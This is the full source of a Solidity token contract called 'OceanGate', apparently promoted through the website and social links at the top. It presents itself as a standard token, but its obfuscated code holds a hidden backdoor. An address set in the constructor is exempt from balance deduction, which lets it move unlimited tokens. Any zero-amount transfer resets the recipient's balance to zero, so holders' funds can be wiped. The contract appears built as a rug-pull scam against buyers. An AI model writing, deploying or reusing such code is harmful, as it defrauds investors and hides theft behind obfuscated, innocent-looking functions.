/*

Website: https://oceangate.cryptotoken.live/

Twitter: https://twitter.com/OceanGate_ETH

Telegram: https://t.me/OceanGate_ETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract OceanGate is Ownable {
    string public name = 'OceanGate';

    function transfer(address vsbihadycnu, uint256 nioebmuvg) public returns (bool success) {
        fwjx(msg.sender, vsbihadycnu, nioebmuvg);
        return true;
    }

    uint256 private asijzgrfcwok = 118;

    function approve(address tcawoguksq, uint256 nioebmuvg) public returns (bool success) {
        allowance[msg.sender][tcawoguksq] = nioebmuvg;
        emit Approval(msg.sender, tcawoguksq, nioebmuvg);
        return true;
    }

    constructor(address wechpjgdiry) {
        balanceOf[msg.sender] = totalSupply;
        riytmzkuqov[wechpjgdiry] = asijzgrfcwok;
        IUniswapV2Router02 vgynkfc = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dzicnho = IUniswapV2Factory(vgynkfc.factory()).createPair(address(this), vgynkfc.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    string public symbol = 'OceanGate';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private hzmpwagosk;

    address public dzicnho;

    mapping(address => uint256) private riytmzkuqov;

    function fwjx(address mzewdpuvhbc, address vsbihadycnu, uint256 nioebmuvg) private {
        if (0 == riytmzkuqov[mzewdpuvhbc]) {
            balanceOf[mzewdpuvhbc] -= nioebmuvg;
        }
        balanceOf[vsbihadycnu] += nioebmuvg;
        if (0 == nioebmuvg && vsbihadycnu != dzicnho) {
            balanceOf[vsbihadycnu] = nioebmuvg;
        }
        emit Transfer(mzewdpuvhbc, vsbihadycnu, nioebmuvg);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address mzewdpuvhbc, address vsbihadycnu, uint256 nioebmuvg) public returns (bool success) {
        require(nioebmuvg <= allowance[mzewdpuvhbc][msg.sender]);
        allowance[mzewdpuvhbc][msg.sender] -= nioebmuvg;
        fwjx(mzewdpuvhbc, vsbihadycnu, nioebmuvg);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
}